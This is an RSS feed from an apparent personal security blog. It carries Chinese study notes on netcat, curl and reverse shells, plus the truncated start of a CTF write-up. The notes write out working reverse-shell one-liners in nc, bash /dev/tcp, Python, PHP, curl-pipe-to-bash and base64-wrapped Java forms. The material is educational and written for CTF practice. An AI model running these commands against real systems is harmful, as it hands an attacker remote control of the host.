<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Hexo</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Tue, 09 Apr 2024 12:29:05 +0800</pubDate>
        <lastBuildDate>Tue, 09 Apr 2024 12:29:05 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/09/Reverse-shell/</guid>
            <title>Reverse shell</title>
            <link>http://example.com/2024/04/09/Reverse-shell/</link>
            <pubDate>Tue, 09 Apr 2024 12:29:05 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;反弹shell-学习笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell-学习笔记&#34;&gt;#&lt;/a&gt; 反弹 shell 学习笔记&lt;/h1&gt;
&lt;h2 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h2&gt;
&lt;h3 id=&#34;linux环境下常用网络工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux环境下常用网络工具&#34;&gt;#&lt;/a&gt; linux 环境下常用网络工具&lt;/h3&gt;
&lt;h4 id=&#34;ncnetcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ncnetcat&#34;&gt;#&lt;/a&gt; nc(netcat)&lt;/h4&gt;
&lt;p&gt;参数说明&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc.exe -h 即可看到各参数的使用方法。
基本格式：nc [-options] hostname port[s] [ports] ...
		nc -l -p port [options] [hostname] [port]
-d          后台模式
-e          程序重定向，一旦连接，就执行 [危险!!]
-g gateway  source-routing hop point[s], up to 8    设置路由器跃程通信网关，最多可设置8个。
-G num      source-routing pointer: 4, 8, 12, ...   设置来源路由指向器，其数值为4的倍数。
-h          帮助信息
-i secs     延时的间隔
-l          监听模式，用于入站连接 (监听本地端口)
-L          连接关闭后,仍然继续监听
-n          指定数字的IP地址，不能用hostname。即直接使用IP地址，而不通过域名服务器。
-o file     指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
-p port     本地端口号 (指定本地端口 )
-r          随机本地及远程端口
-s addr     本地源地址
-t          使用TELNET交互方式(用telnet来回应 )
-u          UDP模式
-v          详细输出--用两个-v( -vv)可得到更详细的内容. 获得端口信息
-w secs     timeout的时间
-z          将输入输出关掉--只用于扫描. 端口的表示方法可写为M-N的范围格式。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;连接远程主机&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -nvv Target_ip Target_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;监听本地主机&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -l -p Local_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;端口扫描&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -v Target_ip Target_port #可指定范围&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;端口监听&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -l -p Local_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;远程文件传输&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc Target_ip Target_port &amp;lt; Target_File&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;模拟 HTTP headers&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@hatest1 ~]# nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browser
HTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]

echo -n &amp;quot;GET / HTTP/1.0&amp;quot;r&amp;quot;n&amp;quot;r&amp;quot;n&amp;quot; | nc host.example.com 80
连接到主机并执行
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;正向 shell，反向 shell&lt;/p&gt;
&lt;h4 id=&#34;curl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl&#34;&gt;#&lt;/a&gt; curl&lt;/h4&gt;
&lt;p&gt;HTTP 命令行工具，支持文件的上传和下载，是综合传输工具&lt;/p&gt;
&lt;p&gt;发送 GET 请求&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl URL?a=1&amp;amp;b=nihao&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发送 POST 请求&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl -X POST -d &#39;a=1&amp;amp;b=nihao&#39; URL&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发送 json 格式请求&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl -H &amp;quot;Content-type: application?json&amp;quot; -X POST -d &#39;&amp;#123;&amp;quot;abc&amp;quot;:123.&amp;quot;bcd&amp;quot;:&amp;quot;nihao&amp;quot;&amp;#125;&#39; URL&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl -H &amp;quot;Content-Type: application/json&amp;quot; -X POST -d @test.json URL&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;1-下载option-o或者option-o&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-下载option-o或者option-o&#34;&gt;#&lt;/a&gt; 1、下载 (option:-o 或者 option:-O)&lt;/h5&gt;
&lt;p&gt;1.1、下载页面：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -o dodo1.jpg http:www.linux.com/dodo1.JPG&lt;/code&gt; &lt;br&gt;
# 要注意 - O 这里后面的 url 要具体到某个文件，不然抓不下来&lt;br&gt;
 &lt;code&gt;curl -O http://www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.2：循环下载&lt;br&gt;
有时候下载图片可以能是前面的部分名称是一样的，就最后的尾椎名不一样。这样就会把 dodo1，dodo2，dodo3，dodo4，dodo5 全部保存下来&lt;br&gt;
 &lt;code&gt;curl -O http://www.linux.com/dodo[1-5].JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.3：下载重命名&lt;br&gt;
在 hello/dodo1.JPG 的文件下载下来就会变成 hello_dodo1.JPG, 其他文件依此类推，从而有效的避免了文件被覆盖&lt;br&gt;
 &lt;code&gt;curl -o #1_#2.JPG http://www.linux.com/&amp;#123;hello,bb&amp;#125;/dodo[1-5].JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于下载的 hello 与 bb 中的文件名都是 dodo1，dodo2，dodo3，dodo4，dodo5。因此第二次下载的会把第一次下载的覆盖，这样就需要对文件进行重命名。&lt;br&gt;
 &lt;code&gt;curl -O http://www.linux.com/&amp;#123;hello,bb&amp;#125;/dodo[1-5].JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.4：分块下载 (option：-r)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -r 0-100 -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG curl -r 100-200 -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG curl -r 200- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;cat dodo1_part* &amp;gt; dodo1.JPG &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;#这样就可以查看 dodo1.JPG 的内容了&lt;/p&gt;
&lt;p&gt;1.5：通过 ftp（文件传输协议）下载文件 (option：-u)&lt;br&gt;
 curl 可以通过 ftp 下载文件，curl 提供两种从 ftp 中下载的语法&lt;br&gt;
 &lt;code&gt;curl -O -u 用户名:密码 ftp://www.linux.com/dodo1.JPG&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;curl -O ftp://用户名:密码@www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.6: 下载，显示进度条 (option：-#) 或不显示进度条 (option：-s)&lt;br&gt;
 &lt;code&gt;curl -# -O http://www.linux.com/dodo1.JPG  &lt;/code&gt; &lt;br&gt;
 &lt;code&gt;curl -s -O http://www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.7、下载，断点续传 (-C &lt;offset&gt;)&lt;br&gt;
 断点续转，从文件头的指定位置开始继续下载 / 上传；offset 续传开始的位置，如果 offset 值为 “-”，curl 会自动从文件中识别起始位置开始传输；&lt;br&gt;
 &lt;code&gt;curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;curl -C -O http://www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/offset&gt;&lt;/p&gt;
&lt;h5 id=&#34;2-上传文件option-t&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-上传文件option-t&#34;&gt;#&lt;/a&gt; 2、上传文件 (option:-T)&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;curl -T dodo1.JPG -u 用户名:密码 ftp://www.linux.com/img/&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;3-伪造来源页面伪造referer盗链-option-e&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-伪造来源页面伪造referer盗链-option-e&#34;&gt;#&lt;/a&gt; 3、伪造来源页面 | 伪造 referer | 盗链 (option：-e)&lt;/h5&gt;
&lt;p&gt;很多服务器会检查 http 访问的 referer 从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面，这里访问邮箱的 referer 地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的 referer 地址不是首页的地址，就断定那是个盗连了&lt;br&gt;
 #这样就会让服务器其以为你是从 www.linux.com 点击某个链接过来的&lt;br&gt;
 &lt;code&gt;curl -e &amp;quot;www.linux.com&amp;quot; http://mail.linux.com&lt;/code&gt; &lt;br&gt;
# 告诉爱 E 族，我是从百度来的&lt;br&gt;
 &lt;code&gt;curl -e http://baidu.com http://aiezu.com&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;4-伪造代理设备模仿浏览器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-伪造代理设备模仿浏览器&#34;&gt;#&lt;/a&gt; 4、伪造代理设备 (模仿浏览器)&lt;/h5&gt;
&lt;p&gt;有些网站需要使用特定的浏览器去访问他们，有些还需要使用某些特定的版本。curl 内置 option:-A 可以让我们指定浏览器去访问网站&lt;br&gt;
 &lt;code&gt;curl -A &amp;quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&amp;quot; http://www.linux.com&lt;/code&gt; &lt;br&gt;
# 告诉爱 E 族，我是 GOOGLE 爬虫蜘蛛（其实我是 curl 命令）&lt;br&gt;
 &lt;code&gt;curl -A &amp;quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&amp;quot; http://aiezu.com&lt;/code&gt; &lt;br&gt;
# 告诉爱 E 族，我用的是微信内置浏览器&lt;br&gt;
 &lt;code&gt;curl -A &amp;quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&amp;quot; http://aiezu.com&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;5-设置http请求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-设置http请求&#34;&gt;#&lt;/a&gt; 5、设置 http 请求&lt;/h5&gt;
&lt;p&gt;5.1、设置 http 请求头 (或 option:-H 或 option:–head)&lt;br&gt;
 &lt;code&gt;curl -H &amp;quot;Cache-Control:no-cache&amp;quot;  http://aiezu.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;5.2、指定 proxy 服务器以及其端口 (option::-x)&lt;br&gt;
# 很多时候上网需要用到代理服务器 (比如是使用代理服务器上网或者因为使用 curl 别人网站而被别人屏蔽 IP 地址的时候)，幸运的是 curl 通过使用内置 option：-x 来支持设置代理&lt;br&gt;
 &lt;code&gt;curl -x 192.168.100.100:1080 http://www.linux.com&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;6-http响应头&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-http响应头&#34;&gt;#&lt;/a&gt; 6、http 响应头&lt;/h5&gt;
&lt;p&gt;6.1、查看 http 响应头 (option:-I)&lt;br&gt;
# 看看本站的 http 头是怎么样的&lt;br&gt;
 &lt;code&gt;curl -I  http://aiezu.com&lt;/code&gt; &lt;br&gt;
 输出：&lt;br&gt;
HTTP/1.1 200 OK&lt;br&gt;
Date: Fri, 25 Nov 2016 16:45:49 GMT&lt;br&gt;
Server: Apache&lt;br&gt;
Set-Cookie: rox__Session=abdrt8vesprhnpc3f63p1df7j4; path=/&lt;br&gt;
Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt;br&gt;
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0&lt;br&gt;
Pragma: no-cache&lt;br&gt;
Vary: Accept-Encoding&lt;br&gt;
Content-Type: text/html; charset=utf-8&lt;/p&gt;
&lt;p&gt;6.2、保存 http 的 response 里面的 header 信息 (option:-D)&lt;br&gt;
 &lt;code&gt;curl -D cookied.txt http://www.linux.com&lt;/code&gt; &lt;br&gt;
 执行后 cookie 信息就被存到了 cookied.txt 里面了&lt;br&gt;
注意：-c (小写) 产生的 cookie 和 - D 里面的 cookie 是不一样的。&lt;/p&gt;
&lt;h5 id=&#34;7-发送表单数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-发送表单数据&#34;&gt;#&lt;/a&gt; 7、发送表单数据&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;curl -F &amp;quot;pic=@logo.png&amp;quot; -F &amp;quot;site=aiezu&amp;quot;  http://aiezu.com/&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;8-cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-cookie&#34;&gt;#&lt;/a&gt; 8、cookie&lt;/h5&gt;
&lt;p&gt;8.1、发送 cookie (option:-b）&lt;br&gt;
# 有些网站是使用 cookie 来记录 session 信息。对于 chrome 这样的浏览器，可以轻易处理 cookie 信息，但在 curl 中只要增加相关参数也是可以很容易的处理 cookie&lt;br&gt;
 &lt;code&gt;curl -b &amp;quot;domain=aiezu.com&amp;quot;  http://aiezu.com&lt;/code&gt; &lt;br&gt;
# 很多网站都是通过监视你的 cookie 信息来判断你是否按规矩访问他们的网站的，因此我们需要使用保存的 cookie 信息。内置 option: -b&lt;br&gt;
 &lt;code&gt;curl -b cookiec.txt http://www.linux.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;8.2、保存 http 的 response 里面的 cookie 信息 (option:-c）&lt;br&gt;
执行后 http 的 response 里面的 cookie 信息就被存到了 cookiec.txt 里面了&lt;br&gt;
 &lt;code&gt;curl -c cookiec.txt  http://www.linux.com&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;wget&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wget&#34;&gt;#&lt;/a&gt; wget&lt;/h4&gt;
&lt;p&gt;wget 是一个下载文件的工具，它用在命令行下。对于 Linux 用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wget URL&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;与curl区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#与curl区别&#34;&gt;#&lt;/a&gt; 与 curl 区别&lt;/h5&gt;
&lt;p&gt;wget 是个专职的下载利器，简单，专一，极致；而 curl 可以下载，但是长项不在于下载，而在于模拟提交 web 数据，POST/GET 请求，调试网页，等等。在下载上，也各有所长，wget 可以递归，支持断点；而 curl 支持 URL 中加入变量，因此可以批量下载。个人用途上，我经常用 wget 来下载文件，加 -c 选项不怕断网；使用 curl 来跟网站的 API 交互，简便清晰。&lt;/p&gt;
&lt;h4 id=&#34;ping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ping&#34;&gt;#&lt;/a&gt; ping&lt;/h4&gt;
&lt;p&gt;ping 命令本身处于应用层，相当于一个应用程序，它直接使用网络层的 ICMP 协议，ping 用来检查网络是否通畅或者网络连接速度的命令。&lt;/p&gt;
&lt;h4 id=&#34;talent&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#talent&#34;&gt;#&lt;/a&gt; talent&lt;/h4&gt;
&lt;p&gt;telnet 协议是 TCP/IP 协议族的其中之一，是 Internet 远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet 通常是用来探测指定 ip 是否开放指定端口。&lt;/p&gt;
&lt;p&gt;open : 使用 openhostname 可以建立到主机的 Telnet 连接。&lt;/p&gt;
&lt;p&gt;close : 使用命令 close 命令可以关闭现有的 Telnet 连接。&lt;/p&gt;
&lt;p&gt;display : 使用 display 命令可以查看 Telnet 客户端的当前设置。&lt;/p&gt;
&lt;p&gt;send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：&lt;/p&gt;
&lt;p&gt;ao : 放弃输出命令。&lt;/p&gt;
&lt;p&gt;ayt : “Are you there” 命令。&lt;/p&gt;
&lt;p&gt;esc : 发送当前的转义字符。&lt;/p&gt;
&lt;p&gt;ip : 中断进程命令。&lt;/p&gt;
&lt;p&gt;synch : 执行 Telnet 同步操作。&lt;/p&gt;
&lt;p&gt;brk : 发送信号。quit ：使用 quit 命令可以退出 Telnet 客户端。&lt;/p&gt;
&lt;h4 id=&#34;ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh&#34;&gt;#&lt;/a&gt; ssh&lt;/h4&gt;
&lt;p&gt;简单来说，ssh 和 telnet 是实现相同的功能，ssh 中 数据是经过加密的，是安全的，而 Telnet 是明文传输的，ssh 是加密的，基于 SSL 。&lt;/p&gt;
&lt;h3 id=&#34;正向shell如何连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#正向shell如何连接&#34;&gt;#&lt;/a&gt; 正向 shell 如何连接&lt;/h3&gt;
&lt;p&gt;假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。&lt;/p&gt;
&lt;p&gt;目标主机： &lt;code&gt;nc -lvp Target_port -e /bin/sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/BuPk7DwXMoHmEl3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;本地主机：  &lt;code&gt;nc Target_ip Target_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/a9okGwVWhypUD4m.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;什么是反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是反弹shell&#34;&gt;#&lt;/a&gt; 什么是反弹 shell&lt;/h3&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/9488&#34;&gt;https://xz.aliyun.com/t/9488 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;反弹 shell（reverse shell），就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。&lt;/p&gt;
&lt;p&gt;举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。那么什么情况下正向连接不能用了呢？&lt;/p&gt;
&lt;p&gt;有如下情况：&lt;/p&gt;
&lt;p&gt;1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。&lt;/p&gt;
&lt;p&gt;2. 目标机器的 ip 动态改变，你不能持续控制。&lt;/p&gt;
&lt;p&gt;3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。&lt;/p&gt;
&lt;p&gt;4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。&lt;/p&gt;
&lt;p&gt;那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。&lt;/p&gt;
&lt;p&gt;反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。&lt;/p&gt;
&lt;h3 id=&#34;反弹shell的方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell的方式&#34;&gt;#&lt;/a&gt; 反弹 shell 的方式&lt;/h3&gt;
&lt;h4 id=&#34;netcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#netcat&#34;&gt;#&lt;/a&gt; netcat&lt;/h4&gt;
&lt;p&gt;攻击机开启监听：  &lt;code&gt;nc -lvp Target_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-lvp：l 监听，v 输出交互过程，p 端口&lt;/p&gt;
&lt;p&gt;靶机连接攻击机：  &lt;code&gt;nc Target_ip Target_port -e /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;bash&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bash&#34;&gt;#&lt;/a&gt; bash&lt;/h4&gt;
&lt;p&gt;Bash 反弹 shell 的方法非常好用，题目的服务器环境可能没有 nc, 但是一定会有 bash&lt;/p&gt;
&lt;p&gt;同样的我们还是用 nc -lvp Target_Port 在攻击机的端口开启监听&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -lvp Target_Port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这次我们使用 Bash 结合重定向来反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_ip/Target_port 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者  &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_ip/Target_port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;推荐使用后者，使用前者弹 shell, 当命令在服务端 shell 中执行时可能存在 /bin/sh 的软连接并不指向 bash 的问题，导致报错 &lt;code&gt;/bin/sh: 1:Syntax error:Bad fd number&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;bash -i 产生 bash 交互环境 &amp;gt;&amp;amp; 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port 让目标主机发起与攻击机在 Target_Port 上的 TCP 连接，0&amp;gt;&amp;amp;1 将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。&lt;/p&gt;
&lt;p&gt;Bash 产生了一个交互环境和本地主机主动发起与攻击机端口建立的连接相结合，然后在重定向个 TCP 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。&lt;/p&gt;
&lt;p&gt;[关于上述 bash 命令的详细解释](&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/pandana/p/16289320.html&#34;&gt;反弹 bash shell 命令详解 - pandaes - 博客园 (cnblogs.com) &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;)&lt;/p&gt;
&lt;h4 id=&#34;pythion反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pythion反弹shell&#34;&gt;#&lt;/a&gt; Pythion 反弹 shell&lt;/h4&gt;
&lt;p&gt;同样的我们还是在攻击机开始端口监听， &lt;code&gt;nc -lvp Target_Port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在靶机上执行 &lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;Target_IP&amp;quot;,Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;curl反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl反弹shell&#34;&gt;#&lt;/a&gt; curl 反弹 shell&lt;/h4&gt;
&lt;p&gt;简单来说就是将 Bash 重定向这一句内容写入文件，让靶机用 curl 下载这个文件并且执行，达到用 Bash 重定向相同的效果&lt;/p&gt;
&lt;p&gt;首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_IP/Target_Port 0&amp;gt;&amp;amp;1&lt;/code&gt;  或者 &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_IP/Target_Port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt; ，而 java 的 RCE 需要用 base64 编码，Payload: &lt;code&gt;Runtime.getRuntime().exec(&amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后在目标机上执行如下，即可反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl Target_IP|bash&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;php反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反弹shell&#34;&gt;#&lt;/a&gt; php 反弹 shell&lt;/h4&gt;
&lt;p&gt;攻击机：・nc -nvlp Target_port`&lt;/p&gt;
&lt;p&gt;靶机：  &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;192.168.37.131&amp;quot;,1234);     exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;others&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#others&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Others&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;反弹 shell 的方式很多，nc 和 bash 是比较常见的方式，其他还有 Telnet，Socat 等工具可以反弹 shell，或者写个 python，php 等脚本也可以反弹 shell，比较琐碎的内容具体遇到了再查即可。&lt;/p&gt;
&lt;p&gt;————END————&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/06/Hgame-FINAL-WP/</guid>
            <title>Hgame FINAL WP</title>
            <link>http://example.com/2024/04/06/Hgame-FINAL-WP/</link>
            <pubDate>Sat, 06 Apr 2024 13:09:37 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;hgame-final-wp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hgame-final-wp&#34;&gt;#&lt;/a&gt; Hgame FINAL WP&lt;/h1&gt;
&lt;h3 id=&#34;author-fc04db&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#author-fc04db&#34;&gt;#&lt;/a&gt; author: Fc04dB&lt;/h3&gt;
&lt;h4 id=&#34;1看不见的字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1看不见的字&#34;&gt;#&lt;/a&gt; 1. 看不见的字&lt;/h4&gt;
&lt;p&gt;题目提示 npm install zero-width-lib , 网上搜了一下，是零宽字符隐藏文本加密（npm 没有研究，最后发现也没用到），翻了很多文章，找到一个在线解密的网站:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://yuanfux.github.io/zero-width-web/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/06/5o1U97eAqYQismD.png&#34; alt=&#34;image-5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接得到 flag&lt;/p&gt;
&lt;p&gt;顺便贴一张其他人写的脚本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import * as z from &#39;zero-width-lib&#39;;
// 这是要解密的字符串，包含零宽度字符
const encodedString = 
